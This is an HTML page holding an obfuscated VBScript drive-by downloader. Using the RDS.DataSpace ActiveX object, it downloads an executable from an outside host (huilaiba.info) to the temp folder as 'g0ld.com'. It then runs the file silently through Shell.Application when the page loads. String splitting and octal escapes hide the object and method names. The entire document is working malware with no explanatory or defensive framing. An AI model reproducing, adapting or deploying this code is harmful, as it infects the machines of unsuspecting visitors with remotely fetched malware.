<html>
<title>Cike</title>
<script language="VBScript">
on error resume next
Cike="http://xxx.huilaiba.info/ww/la.exe"
dl = Cike
Set df = document.createElement("ob"&"ject")
df.setAttribute "classid", "clsid:BD96C55"&"6-65A3-11D0-983A-00C04FC29E36"
str="Microsoft"&".XMLHTTP"
Set x = df.CreateObject(str,"")
a1="Ado"
a2="db."
a3="Str"&"ea"
str1=a1&a2&a3
str5=str1
set S = df.createobject(str5&"m","")
S.type = 1
str6="G"&"ET"
x.Open str6, dl, False
x.Send
fname1="g0ld"&".com"
set F = df.createobject("Scripti"&"ng.FilesystemObject","")
set tmp = F.GetSpecialFolder(2) 
S.open
fname1= F.BuildPath(tmp,fname1)
S.write x.["\162\145\163\160\157\156\163\145\102\157\144\171"]
S.["\163\141\166\145\164\157\146\151\154\145"] fname1,2
S.close
set Q = df.createobject("Shell.Ap"&"plication","")
Q.ShellExecute fname1,"","","ope"&"n",0
</script>